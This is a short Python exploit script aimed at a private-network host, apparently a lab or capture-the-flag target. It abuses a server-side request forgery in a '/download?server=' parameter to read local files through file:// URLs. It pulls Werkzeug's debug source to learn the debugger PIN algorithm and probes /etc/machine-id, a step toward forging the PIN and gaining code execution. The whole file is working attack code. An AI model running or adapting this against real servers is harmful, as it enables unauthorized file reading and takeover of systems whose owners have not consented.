"""Read the actual Werkzeug debug source to get the exact PIN algorithm."""
import requests

T = "http://10.82.168.213"

def read_ssrf(path):
    r = requests.get(f"{T}/download?server=file://{path}?&id=1", timeout=8)
    if r.status_code == 200 and "Werkzeug" not in r.text:
        return r.content.decode(errors="replace")
    return None

# Read the actual Werkzeug debug __init__.py
paths = [
    "/usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py",
    "/usr/local/lib/python3.10/site-packages/werkzeug/debug/init.py",
]

for p in paths:
    data = read_ssrf(p)
    if data:
        print(f"[FOUND] {p} ({len(data)} bytes)")
        print(data)
        break
    else:
        print(f"[MISS] {p}")

# Also check /etc/machine-id existence
print("\n--- Checking machine-id ---")
r = requests.get(f"{T}/download?server=file:///etc/machine-id?&id=1", timeout=8)
print(f"/etc/machine-id status: {r.status_code}, len: {len(r.content)}")
if "Couldn" in r.text:
    print("  File does not exist")
elif len(r.content) < 200:
    print(f"  Content: {r.content}")
